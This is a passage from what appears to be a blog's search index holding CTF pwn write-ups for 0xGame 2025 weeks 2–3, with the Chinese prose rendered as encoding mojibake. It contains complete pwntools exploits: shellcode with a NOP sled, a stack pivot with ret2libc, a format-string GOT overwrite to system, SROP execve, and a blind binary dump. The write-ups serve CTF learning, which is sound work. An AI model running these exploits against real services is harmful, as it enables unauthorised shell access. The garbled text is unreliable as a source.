çš„readå‡½æ•°ã€‚\ns2æ˜¯å»æ„é€ äº†execveå‡½æ•°ï¼Œè¿™é‡Œçš„rdiè®¾ç½®çš„æ˜¯å­˜æ”¾ç€&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œå¯ä»¥é€šè¿‡gdbåŠ¨è°ƒå‡ºæ¥ã€‚\n\nè¿™é‡Œå¯ä»¥çœ‹å‡ºæˆ‘ä»¬å†™å…¥çš„&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œç„¶åå°†rdiçš„å€¼æ§åˆ¶ä¸ºbinshçš„åœ°å€å°±å¯ä»¥äº†ã€‚\n","categories":["stack"],"tags":["pwnå…¥é—¨"]},{"title":"2025-0xGame-Week3-Pwn","url":"/2026/01/05/2025-0xGame-Week3-Pwn/","content":"0xGame-Week3-Pwn1.Ret2shellcodeint __fastcall main(int argc, const char **argv, const char **envp)&#123;  int random_number; // eax  int i; // [rsp+Ch] [rbp-14h]  init(argc, argv, envp);  puts(&quot;have a good time&quot;);  mprotect((void *)((unsigned __int64)&amp;buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);  read(0, &amp;buf, 0x100uLL);  for ( i = 0; i &lt;= 256; ++i )    ;  random_number = get_random_number();  ((void (*)(void))((char *)&amp;buf + random_number % 80 + 80))();  return 0;&#125;\n\nåœ¨Linuxç³»ç»Ÿä¸­ï¼Œmprotectå‡½æ•°ç”¨äºä¿®æ”¹æŒ‡å®šå†…å­˜åŒºåŸŸçš„ä¿æŠ¤å±æ€§ã€‚\næ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œç»™ bufåŒºï¼Œ0x1000é•¿åº¦ï¼Œ7çš„æƒé™ï¼Œä¹Ÿå°±æ˜¯rwxæƒé™ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œå¯ä»¥å¾€bufé‡Œè¯»å…¥shellcodeä»è€Œgetshellã€‚ä¸è¿‡è¿™é‡Œç”±äºæœ€åè°ƒç”¨å‡½æ•°çš„ä½ç½®æ˜¯buf+random_number%80+80ï¼Œæ‰€ä»¥offsetåœ¨80-159ã€‚ç”±äºæˆ‘ä»¬å¯ä»¥è¯»å…¥0x100çš„æ•°æ®ï¼Œæ‰€ä»¥ä¸ç®¡å…·ä½“åœ¨å“ªé‡Œæ‰§è¡Œï¼Œæˆ‘ä»¬éƒ½å¯ä»¥å¡«å…¥å¤§é‡çš„nopï¼Œæ¥ä½¿å‡»ä¸­æˆ‘ä»¬shellcodeçš„æ¦‚ç‡å¤§å¤§å¢åŠ ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.arch = &#x27;amd64&#x27;io = remote(&#x27;nc1.ctfplus.cn&#x27;,42606)pl = asm(shellcraft.sh()).rjust(0x100,b&#x27;\\x90&#x27;) #nopio.recvuntil(b&#x27;have a good time&#x27;)io.send(pl)io.interactive()\n\n\n\n2.æ ˆè¿ç§»ä¸¢è¿›idaå‘ç°å°±åªæœ‰ä¸€ä¸ªvulnå‡½æ•°é‡Œç»™äº†readå‡½æ•°çš„æ ˆæº¢å‡ºã€‚è€Œä¸”æº¢å‡ºå¤§å°åªæœ‰0x10ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡æ ˆè¿ç§»æ¥è·å–è¾ƒå¤§çš„ç©ºé—´ï¼Œæ¥æ„é€ æˆ‘ä»¬çš„ropã€‚\nä¸‹é¢å…ˆç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;io = remote(&#x27;nc1.ctfplus.cn&#x27;,38325)#io = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]vuln = elf.symbols[&#x27;vuln&#x27;]rdi = 0x4011c5ret = 0x4011f4bss = 0x404070 + 0x500 #rsppop_rbp = 0x40115doffset = 0x100read = elf.plt[&#x27;read&#x27;]leave = 0x4011f3#---&gt; bsspl1 = b&#x27;a&#x27; * 0x100 + p64(bss+offset) + p64(0x4011d9) #leaio.recvuntil(b&#x27; :)&#x27;)#gdb.attach(io)io.send(pl1)pl2 = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(bss+0x300+offset) + p64(0x4011d9)pl2 = pl2.ljust(0x100,b&#x27;\\x00&#x27;) + p64(bss-8) + p64(leave) #gdb.attach(io)io.send(pl2)base = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:]+b&#x27;\\x00\\x00&#x27;) - libc.sym.putssuccess(hex(base))binsh = base + next(libc.search(&#x27;/bin/sh\\x00&#x27;))sys = base + libc.sym.systempl3 = b&#x27;a&#x27;*8 + p64(rdi) + p64(binsh) + p64(ret) + p64(sys)pl3 = pl3.ljust(offset,b&#x27;\\x00&#x27;) + p64(bss+0x300) + p64(leave)#gdb.attach(io)io.send(pl3)io.interactive()\n\nè¿™é‡ŒbssåŠ ä¸Š0x500æ˜¯ä¸ºäº†æ”¾ç½®å†™å…¥çš„æ•°æ®ç ´åäº†bssæ®µæœ¬èº«å°±æœ‰çš„æ•°æ®ï¼Œå¯¼è‡´ç¨‹åºæŠ¥é”™ã€‚\næƒ³è¦äº†è§£æ ˆè¿ç§»å‰ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£leaveå’Œretã€‚\nleaveå…¶å®å¯ä»¥ç†è§£ä¸ºmov rsp,rbp;pop rbpï¼Œè€Œretå¯ä»¥ç†è§£ä¸ºpop ripã€‚æ‰€ä»¥bss+offsetä¼šè¢«å¼¹ä¸ºæ–°çš„rbpåœ°å€ï¼Œç„¶åè¿”å›0x4011d9å¤„å»æ‰§è¡Œã€‚\nçœ‹åˆ°pl1è¿™é‡Œæ˜¯bss+0x100ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºè¿™é‡Œbss+0x100å®é™…ä¸Šæ˜¯å…ˆå»å®šä¸‹äº†rbpçš„åœ°å€ï¼Œåé¢å†æ¬¡è°ƒç”¨readçš„æ—¶å€™ï¼Œå»å¼€è¾Ÿç©ºé—´æ˜¯æ ¹æ®rbpæ¥å¯»å€ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šå‡æ‰0x100çš„å­—èŠ‚å¤§å°ã€‚æ‰€ä»¥æœ€åæˆ‘ä»¬çš„bsså°±å®šä¸‹äº†rspçš„åœ°å€ã€‚åé¢çš„0x4011d9æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è¿™é‡Œå…·ä½“å¹²äº†ä»€ä¹ˆã€‚\n\nå¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™é‡Œå°±æ˜¯æˆ‘ä»¬è¯´çš„æ ¹æ®rbpæ¥å¼€è¾Ÿreadçš„è¯»å…¥ç©ºé—´ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ­¤æ—¶æˆ‘ä»¬å°†rbpçš„åœ°å€æ”¹ä¸ºbssæ®µä¸ŠæŸä¸€å¤„çš„åœ°å€ï¼Œç„¶åè¯»å…¥çš„ç¼“å†²åŒºä¹Ÿè·Ÿç€åˆ°äº†bssæ®µäº†ã€‚\næ¥ç€å°±æ˜¯æ–°çš„ä¸€è½®readï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬å¾€bssæ®µä¸Šå†™å…¥äº†ä»€ä¹ˆã€‚\npl2 = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(bss+0x300+offset) + p64(0x4011d9)pl2 = pl2.ljust(0x100,b&#x27;\\x00&#x27;) + p64(bss-8) + p64(leave) \n\nå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬æ˜¯æƒ³è¦æ³„éœ²libc_baseçš„åœ°å€ã€‚ç„¶åæˆ‘ä»¬åœ¨bssæ®µä¸Šæ„é€ äº†ä¸€ä¸ªå‡çš„leakåé¢çš„pop_rbpç›¸å½“äºleave;retæŒ‡ä»¤ï¼Œæ˜¯ä¸ºäº†äºŒæ¬¡è¯»å…¥shellcodeï¼ŒåŒæ—¶å†å°†rbpçš„åœ°å€è¿ç§»åˆ°æ›´é«˜çš„ä½ç½®ã€‚åé¢åˆè¯»å…¥ä¸€æ¬¡ï¼Œå°±æ˜¯å’Œret2libcç±»ä¼¼çš„æ‰“æ³•ã€‚å…³é”®è¿™é‡Œéœ€è¦çœ‹æ‡‚å„ä¸ªæ ˆçš„ä½ç½®ã€‚ç”±äºrspä¼šåœ¨è¿›ç¨‹ä¸­è‡ªå¢8ï¼Œå¯ä»¥é€šè¿‡gdbçœ‹å‡ºï¼Œæ‰€ä»¥åé¢æˆ‘ä»¬leaveå¤„å†™å…¥çš„åœ°å€æ˜¯bss-8ï¼Œç„¶årspå¤„åˆä¼šå¼¹åˆ°bssæ®µï¼Œæ­£å¥½å¸ƒç½®åˆ°æˆ‘ä»¬pop_rdiçš„åœ°æ–¹ï¼Œç„¶åæ³„éœ²libc_baseã€‚\npl3å¤„å†™ä¸€ä¸ªbâ€™aâ€™*8æ˜¯å› ä¸ºæˆ‘ä»¬æœ€åæœ‰ä¸€ä¸ªleaveã€‚æ‰€ä»¥ä¼špop ripä¹Ÿå°±æ˜¯å°†æ ˆé¡¶çš„å†…å®¹å¼¹å‡ºã€‚é‚£ä¹ˆå¦‚æœæ˜¯ä¸å¡«å……paddingçš„è¯ï¼Œå°±ä¼šå¯¼è‡´æˆ‘ä»¬çš„pop_rdiçš„æŒ‡ä»¤è¢«pop åˆ°ripé‡Œï¼Œæ­¤æ—¶æˆ‘ä»¬æ„é€ çš„ropå°±è¢«ç ´åäº†ã€‚æ‰€ä»¥éœ€è¦ç»™rbpä¸€ä¸ªå€¼ã€‚éœ€è¦é…åˆgdbé€æ­¥è°ƒè¯•ã€‚\n3.FMTï¼Ÿè¿™æ¬¡æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¸åœ¨æ ˆä¸Šäº†ï¼Œæˆ‘ä»¬åˆè¯¥æ€ä¹ˆåˆ©ç”¨ä»»æ„åœ°å€è¯»å’Œå†™å‘¢ï¼Ÿ\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  puts(&quot;I know you can rce from fmt&quot;);  while ( 1 )  &#123;    puts(&quot;But without stack,how can you change val?&quot;);    read(0, bss, 0x200uLL);    printf(bss);  &#125;&#125;\n\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¯»å…¥çš„åœ°å€éƒ½åœ¨bssæ®µã€‚æˆ‘ä»¬è¿›gdbè°ƒè¯•å¯ä»¥çœ‹åˆ°\n\nå¯ä»¥çœ‹å‡ºæ¥è¿™æœ‰å¤šçº§æŒ‡é’ˆå¯ä»¥æŒ‡å‘mainçš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆçŸ¥é“printf_gotè¡¨çš„åœ°å€å’Œmainå‡½æ•°ç›¸å·®ä¸æ˜¯å¾ˆå¤§ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ”¹å†™mainä¸ºprintf_gotçš„åœ°å€ï¼Œå†å°†printfçš„çœŸå®åœ°å€æ”¹å†™ä¸ºsystemçš„åœ°å€ï¼Œå°±å¯ä»¥åœ¨æˆ‘ä»¬è¯»å…¥shellæ—¶æˆåŠŸgetsehlläº†ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *#context.log_level =  &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)io = process(&#x27;./pwn&#x27;)#io = remote(&#x27;nc1.ctfplus.cn&#x27;,45337)def sd(payload):    io.recvuntil(b&#x27;val?&#x27;)    io.send(payload)io.recvuntil(b&#x27;val?&#x27;)io.send(b&#x27;aa%7$pbb%11$p&#x27;)io.recvuntil(b&#x27;aa&#x27;)base = int(io.recv(14),16) - 0x29d90success(f&#x27;base---&gt;&#x27;+hex(base))io.recvuntil(b&#x27;bb&#x27;)stack = int(io.recv(14),16)success(f&#x27;stack---&gt;&#x27;+hex(stack))sys = base + libc.sym.systemsuccess(hex(sys))stack1 = stack - 0x100stack2 = stack - 0xd0success(f&#x27;stack1---&gt;&#x27;+hex(stack1))  #de88success(f&#x27;stack2---&gt;&#x27;+hex(stack2))  #deb8pl1 = f&#x27;%&#123;stack1&amp;0xffff&#125;c%11$hn&#x27;#gdb.attach(io)sd(pl1)got = 0x4028pl2 = f&#x27;%&#123;got&#125;c%41$hn&#x27;#gdb.attach(io)sd(pl2)high = (sys&gt;&gt;16)&amp;0xfflow = sys&amp;0xffffsuccess(f&#x27;high---&gt;&#x27;+hex(high))success(f&#x27;low---&gt;&#x27;+hex(low))pl3 = f&#x27;%&#123;stack2&amp;0xffff&#125;c%11$hn&#x27;#gdb.attach(io)sd(pl3)pl4 = f&#x27;%&#123;got+2&#125;c%41$hn&#x27;#gdb.attach(io)sd(pl4)pl5 = f&#x27;%&#123;high&#125;c%15$hhn&#x27;pl5 += f&#x27;%&#123;low-high&#125;c%9$hn&#x27;#gdb.attach(io)sd(pl5)sd(b&#x27;/bin/sh&#x27;)io.interactive()\n\npl1çš„ä½œç”¨æ˜¯å°†åç§»ä¸º11å¤„çš„åœ°å€æŒ‡å‘mainï¼Œç„¶åpl2æ˜¯æ”¹ä¸ºprintf_gotè¡¨åœ°å€ã€‚çœ‹çœ‹æ•ˆæœ\n\nå¯ä»¥çœ‹åˆ°åé¢ç›´æ¥ç»™å‡ºäº†printfçš„çœŸå®åœ°å€ã€‚ç”±äºå•æ¬¡æ”¹å†™å­—èŠ‚ä¸èƒ½å¤ªå¤§ï¼Œä¸€èˆ¬å»ºè®®1-2å­—èŠ‚æ”¹å…¥ï¼Œè€Œæ¯”è¾ƒå¯ä»¥systemå’Œprintfçš„çœŸå®åœ°å€å·®ä¸‰å­—èŠ‚ã€‚æ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡ä¸¤æ¬¡æ”¹å†™ï¼Œä¹Ÿå°±æ˜¯pl5çš„ä½œç”¨ã€‚ç”±äºåŒä¸€å¤„åœ°å€ä¸èƒ½è¿›è¡Œä¸¤å¤„æ”¹å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œåˆå»æ‰¾äº†å¦ä¸€ä¸ªæŒ‡å‘mainçš„åœ°å€ï¼Œé‡æ–°ç»è¡Œä¸Šé¢çš„å·¥ä½œã€‚ä¸è¿‡ç”±äºæˆ‘ä»¬ç¬¬ä¸€æ¬¡æ˜¯æ”¹å†™çš„æœ«äºŒä½å­—èŠ‚ï¼Œæ‰€ä»¥å°†gotçš„åœ°å€+2å°±å¯ä»¥æ”¹å†™ç¬¬æœ«ä¸‰å­—èŠ‚ã€‚\nç”±äºæœ«äºŒä½å­—èŠ‚å†™å…¥çš„é•¿åº¦å¤§äºç¬¬æœ«ä¸‰ä½ã€‚æ‰€ä»¥æˆ‘ä»¬è¿™é‡Œé‡‡ç”¨å…ˆå†™å…¥ç¬¬æœ«ä¸‰ä½å­—èŠ‚ï¼Œå†å†™å…¥æœ«äºŒä½å­—èŠ‚ã€‚\n4.SROPsigned __int64 start()&#123;  signed __int64 v0; // rax  vuln();  v0 = sys_exit(0);  return vuln();&#125;\n\nsigned __int64 vuln()&#123;  char buf[256]; // [rsp+0h] [rbp-100h] BYREF  return sys_write(1u, buf, sys_read(0, buf, 0x300uLL));&#125;\n\nç¨‹åºå¾ˆç®€å•ï¼Œå°±ç»™äº†writeå’Œexitçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå†ç»“åˆé¢˜å¹²æ‰€è¿°ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œè¦ç”¨sropçš„æŠ€å·§ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./pwn&#x27;)io = process(&#x27;./pwn&#x27;)#io = remote(&#x27;nc1.ctfplus.cn&#x27;,43153)sh = 0x40105asyscall_ret = 0x40100fsig = SigreturnFrame()sig.rax = 0x3bsig.rdi = shsig.rsi = 0sig.rdx = 0sig.rip = syscall_retpl = b&#x27;a&#x27;*0x108 + p64(0x401012) + b&#x27;\\0&#x27;*8 + p64(syscall_ret) + bytes(sig)#pl = b&#x27;a&#x27;*0x108 + p64(0x401012) + p64(syscall_ret) + bytes(sig)gdb.attach(io)io.sendline(pl)io.send(b&#x27;a&#x27;*0xf)io.interactive()\n\n\næˆ‘ä»¬å¯ä»¥çœ‹å‡ºelf0x40105aå¤„æ”¾ç€&#x2F;bin&#x2F;shï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å»æ„é€ execveç„¶åæ§åˆ¶rdiå¤„æ”¾ç€shå°±å¥½äº†ã€‚è¿™é‡Œåˆå¤šå¡«å……äº†8ä¸ªå­—èŠ‚æ˜¯å› ä¸ºå†æ¬¡è¯»å®Œæ ˆä¸Šçš„paddingåï¼Œå‘ç°æ­¤æ—¶è·ç¦»rbpçš„è·ç¦»å‘ç”Ÿäº†æ”¹å˜ï¼Œæ­£å¥½å°‘äº†8ä¸ªå­—èŠ‚æ‰€ä»¥è¡¥å…¥ï¼Œè€Œä¸”è¿™å¯¹ç¬¬ä¸€æ¬¡æ²¡æœ‰å½±å“ã€‚\n5.BROPBlind Ropã€‚å¯¹è¿œç«¯ncï¼Œå¤šè¯•å‡ æ¬¡ï¼Œå¯ä»¥å‘ç°è¿™é‡Œå­˜åœ¨fmtæ¼æ´ï¼Œå¹¶ä¸”åç§»é‡æ˜¯6ã€‚\nç„¶åç»“åˆé¢˜å¹²ç»™çš„ä¿¡æ¯æ¥çœ‹ï¼Œå¯ä»¥çœ‹å‡ºpieæ˜¯å…³çš„ï¼Œå¹¶ä¸”åªè¦æˆ‘ä»¬èƒ½æ¥æ”¶åˆ°æ•´ä¸ªç¨‹åºï¼Œæˆ‘ä»¬å°±èƒ½get flagã€‚\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨%n$sæ¥æ¥æ”¶è¿œç«¯çš„æ•°æ®ï¼Œç„¶åè·å–æ•´ä¸ªelfçš„æ•°æ®ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;io = remote(&#x27;nc1.ctfplus.cn&#x27;,23333)begin = 0x400000bin = b&#x27;&#x27;def leak(addr):    pl = b&#x27;%7$sdump&#x27; + p64(addr)    io.sendline(pl)    data = io.recvuntil(&#x27;dump&#x27;)[:-4]    return datatry:    while True:        data = leak(begin)        begin = begin+len(data)        bin +=data        if len(data)==0:            begin +=1            bin += b&#x27;\\x00&#x27;except:    print(&quot;finish&quot;)finally:    print(&#x27;[+]&#x27;,len(bin))    with open(&#x27;dump_bin&#x27;,&#x27;wb&#x27;) as f:        f.write(bin)io.interactive()\n\nè¿™é‡Œç”±äºåç§»æ˜¯6ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™å…¥çš„äºŒ%7$sdumpæ˜¯åœ¨6çš„ä½ç½®ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³„éœ²æ•°æ®çš„ä½ç½®è‡ªç„¶æ˜¯åœ¨åç§»ä¸º7å¤„äº†ã€‚è¿™é‡Œçš„dumpæ˜¯ä¸ºäº†å¹³è¡¡æ ˆï¼Œç„¶ååé¢å°±æ˜¯å¯¹æ•°æ®çš„æ¥æ”¶äº†ã€‚æ¥æ”¶å®Œåï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€å †äºŒè¿›åˆ¶ä¹±ç ã€‚ä»”ç»†æŸ¥æ‰¾ï¼Œå¯ä»¥çœ‹åˆ°å‡ ä¸ªæˆ‘ä»¬èƒ½è¯»æ‡‚çš„å°±æ˜¯flagäº†ã€‚\n\n","categories":["stack"],"tags":["pwnå…¥é—¨"]},{"title":"2025 0xGame Week2 Pwn","url":"/2025/11/12/2025-0xGame-Week2-Pwn/","content":"0xGame Week2 Pwn1.Ret2libcåƒè¿™æ ·ç±»ä¼¼çš„é¢˜ï¼Œå…³é”®æ˜¯ç¡®å®šlibc.so.6çš„ç‰ˆæœ¬ï¼Œç„¶åæ³„éœ²å‡ºlibc_baseçš„åœ°å€ã€‚å› ä¸ºè¿™æ ·å¯ä»¥ç¡®å®šsystemçš„åœ°å€å’Œ&#x2F;bin&#x2F;shçš„åœ°å€ï¼Œä»è€Œå®ç°getshellã€‚\n\nç”±vulnå¯ä»¥çœ‹å‡ºreadå­˜åœ¨æº¢å‡ºç‚¹ã€‚\n\nè§£è¯»ä¸€ä¸‹expï¼Œè¿™è¾¹pl1é€šè¿‡æ ˆæº¢å‡ºï¼Œè¦†ç›–è‡³retï¼Œå› ä¸ºretæŒ‡ä»¤å®é™…ä¸Šç›¸å½“äºpop ripï¼Œå³å°†rspå¤„çš„å€¼å¼¹ç»™ripå»æ‰§è¡Œã€‚æ‰€ä»¥è¿™é‡Œå°†retåœ°å€è¿”å›ä¸ºputs_pltï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œä¸€ä¸ªputså‡½æ•°ï¼ŒåŒæ—¶rdiä¸­å­˜å‚¨ç€putsçš„çœŸå®åœ°å€ï¼Œç”±puts_gotè¡¨è·³è½¬å¾—åˆ°ã€‚å†å‡å»ç”±libc.so.6ç‰ˆæœ¬æ§åˆ¶çš„offsetï¼Œå°±å¯ä»¥è·å¾—libc_baseçš„åœ°å€ã€‚ç„¶åå°±æ˜¯æ­£å¸¸çš„ropé“¾æ”»å‡»ã€‚\n2.æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†é™„ä»¶ä¸¢è¿›idaé™æ€åˆ†æ\n\nå¯ä»¥çœ‹å‡ºè¿™é‡Œæœ‰ä¸¤æ¬¡readå’Œprintfå‡½æ•°ï¼Œå¹¶ä¸”æ¯æ¬¡éƒ½ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®è¾“å‡ºã€‚ç”±äºç¬¬ä¸€ä¸ªreadå‡½æ•°è§„å®šè¯»å–æ•°æ®å¤§å°åªæœ‰0x60ï¼Œæ‰€ä»¥è¿™é‡Œä¸å­˜åœ¨æº¢å‡ºç‚¹ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡ç¬¬ä¸€ä¸ªreadæ¥æ³„éœ²ä¸€äº›æˆ‘ä»¬éœ€è¦çš„æ•°æ®ï¼Œå¦‚canaryå’Œlibc_baseçš„åœ°å€ã€‚Â·ç¬¬äºŒä¸ªreadå­˜åœ¨æ ˆæº¢å‡ºï¼Œæ˜¯æˆ‘ä»¬æ„é€ payloadçš„é‡ç‚¹ã€‚\n\nè¿™é‡Œæ¥è§£é‡Šä¸€ä¸‹expï¼Œé€šè¿‡æ•°æ®æµ‹è¯•ï¼Œå¯ä»¥å¾—åˆ°æˆ‘ä»¬å¡«å…¥çš„æ•°æ®åº”è¯¥åœ¨æ ˆä¸Šç¬¬å…­ä¸ªä½ç½®ã€‚ä»ä¸Šå¾€ä¸‹æ‰¾ï¼Œçœ‹åˆ°æœ«å°¾å­—èŠ‚ä¸º00çš„å°±æ˜¯canaryçš„åœ°å€ã€‚ï¼ˆç‰¹æ€§ï¼‰\n\n\nåœ¨æ ˆä¸Šè·ç¦»æˆ‘ä»¬è¾“å…¥çš„aaaaï¼ˆæµ‹è¯•æ•°æ®ï¼‰ä¸º0x0d-0x00+6(å¯„å­˜å™¨)&#x3D;19ï¼ŒåŒæ—¶æ­¤æ—¶rcxå¤„æ”¾çš„æ˜¯read+18çš„åœ°å€ã€‚æ‰€ä»¥libc_base &#x3D; rcxå†…å­˜çš„åœ°å€ - libc.symbols[â€˜readâ€™] - 18ã€‚å¯ä»¥æ£€éªŒlibc_baseçš„æœ«ä¸‰ä½æ˜¯å¦ä¸º000ã€‚å¦‚æœæ˜¯çš„ï¼Œé‚£ä¹ˆæ­å–œå¾—åˆ°äº†æ­£ç¡®çš„libc_baseã€‚ç„¶åå°±æ˜¯è¿›è¡Œå¯¹printf_gotçš„æ”¹å†™ï¼Œæ”¹å†™ä¸ºsystem_addrã€‚\næ¿å­ä¸ºï¼šfmtstr_payload(6,{printf_got:system_addr})ã€‚ä¸€å®šè¦context.arch&#x3D;â€amd64&#x2F;i386â€ã€‚ä¸è¿‡æœ¬é¢˜ä¼¼ä¹ä»…ä»…ä½¿ç”¨æ¿å­ä¸è¡Œã€‚å› ä¸ºæ­¤å¤„æ¿å­é•¿åº¦ä¸º0x78ï¼Œä¼šå°†canaryçš„åœ°å€è¦†ç›–ï¼Œå¯¼è‡´æ®µé”™è¯¯ã€‚ï¼ˆåˆ»æ„å»ç”¨æ¿å­å…¶å®ä¹Ÿå¯ä»¥æˆåŠŸï¼Œä½†è¿˜æ˜¯æ¨èæ‰‹å†™ï¼‰\né‚£æ€ä¹ˆæ”¹å†™å‘¢ï¼Ÿç”±äºlibc_base+sysmbols[â€˜ â€˜]ï¼Œæ‰€ä»¥å¯¼è‡´äº†systemä¸printfå…¶å®ä»…ä»…æœ‰åä¸‰ä½å­—èŠ‚ä¸åŒä¹Ÿå°±æ˜¯è¯´åªè¦æ”¹å†™åä¸‰ä½å­—èŠ‚å³å¯ã€‚\n\nç”±äºå•æ¬¡å†™å…¥é•¿åº¦è¿‡å¤§ï¼Œå¯èƒ½å¯¼è‡´ä¸ç¨³å®šï¼Œæ‰€ä»¥é€‰æ‹©å•å­—èŠ‚æˆ–åŒå­—èŠ‚å†™å…¥ã€‚ä¹‹åçš„å°±å¯ä»¥çœ‹expã€‚\næœ€åpl2ä¸ºä»€ä¹ˆè¦å¡«å……åˆ°0x30å‘¢ï¼Ÿå› ä¸ºæˆ‘æ”¹å†™çš„åœ°å€æ˜¯12ï¼Œ13ï¼Œå¯¹åº”æ ˆä¸Šçš„ä½ç½®åº”è¯¥æ˜¯06ï¼Œ07ï¼Œè€Œæ­¤æ—¶è·ç¦»rspçš„è·ç¦»å°±æ˜¯0x30ï¼ˆä¸æ–­å‘æ ˆä¸Šå¡«å…¥æ•°æ®ï¼Œä¼šå°†rspâ€æŠ¬é«˜â€ï¼‰ã€‚\n\n3.æ¤ç‰©å¤§æˆ˜åƒµå°¸è¿›idaåˆ†æï¼Œå¯ä»¥çœ‹å‡ºæ˜¯å¤šçº¿ç¨‹é—®é¢˜ï¼Œè€Œä¸”æœªä¸Šé”ï¼Œä¸”å­˜åœ¨1sçš„å»¶è¿Ÿã€‚\n\n\n\nå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œçš„rootå‡½æ•°å­˜åœ¨åé—¨ã€‚æ¥ä¸€ä¸‹å®ç°æ¡ä»¶ï¼Œæ˜¯trophy!&#x3D;0å°±å¯ä»¥äº†ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡åœ¨çŸ­æ—¶é—´å†…å¤§é‡åˆ›å»ºç”¨æˆ·ï¼Œå°†æ•°ç»„å¡«æ»¡ï¼Œå°±å¯ä»¥æ”¹å˜trophyçš„å€¼ä¸ºé0ã€‚ä¸‹é¢æ˜¯expã€‚\n\n4.ä»»æ„ä»£ç æ‰§è¡Œ\nè¿™é‡Œæ˜¯é€šè¿‡æ„é€ shellcodeè¯»å–åˆ°bssæ®µè¿›è¡Œæ¶æ„ä»£ç æ‰§è¡Œã€‚å¯ä»¥çœ‹å‡ºè¿™é‡Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„å­—èŠ‚æ•°å¤§äº3å°±ä¼šç›´æ¥é€€å‡ºç¨‹åºã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»•è¿‡strlenæ£€æµ‹ã€‚é‚£ä¹ˆstrlenæ˜¯å¦‚ä½•æˆªæ–­çš„å‘¢ï¼Ÿæ˜¯é€šè¿‡è¯»å–â€™\\x00â€™çš„å‰çš„å­—èŠ‚æ•°æ¥è¿”å›å­—èŠ‚æ•°å€¼ã€‚äºæ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ â€™\\x00â€™+shellcodeæ¥ç»•è¿‡ã€‚è¿™é“é¢˜è¿˜æœ‰ä¸ªå°å‘ã€‚å¦‚æœç”¨æ¿å­asm(shellcraft.sh())å»è¿›è¡Œshellcodeæ„é€ çš„è¯ï¼Œè¿™é“é¢˜æ˜¯åšä¸å‡ºæ¥çš„ã€‚å› ä¸ºè¿™é‡Œçš„readè¯»å–é•¿åº¦é™åˆ¶ä¸º0xaï¼Œä¹Ÿå°±æ˜¯åªæœ‰10ä¸ªå­—èŠ‚ï¼Œæ˜¯è¿œè¿œå°äºæˆ‘ä»¬ç”¨æ¿å­ç›´æ¥æ„é€ å‡ºæ¥çš„shellcodeçš„ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆæ„é€ ä¸€ä¸ªå¯ä»¥è¯»å–è¶³å¤Ÿé•¿åº¦çš„readå‡½æ•°ï¼Œå†æ¥è°ƒç”¨ï¼Œä»è€Œè¯»å…¥æˆ‘ä»¬éœ€è¦çš„shellcodeã€‚\n\nè¿™è¾¹æ¥è¯´ä¸€ä¸‹æ‰‹åŠ¨æ„é€ ã€‚\n\næƒ³è¦æ„é€ readå‡½æ•°ï¼Œå°±è¦å…ˆæ§åˆ¶readä¼ å‚çš„å¯„å­˜å™¨ã€‚å³rdiâ€“fdï¼Œrsiâ€“bufï¼Œrdxâ€“lenã€‚åœ¨gdbè°ƒè¯•ä¸­ï¼Œå¯ä»¥çœ‹å‡ºï¼Œrdi&#x3D;0ï¼Œè€Œæˆ‘ä»¬ä»ç„¶è¿›è¡Œäº†xor 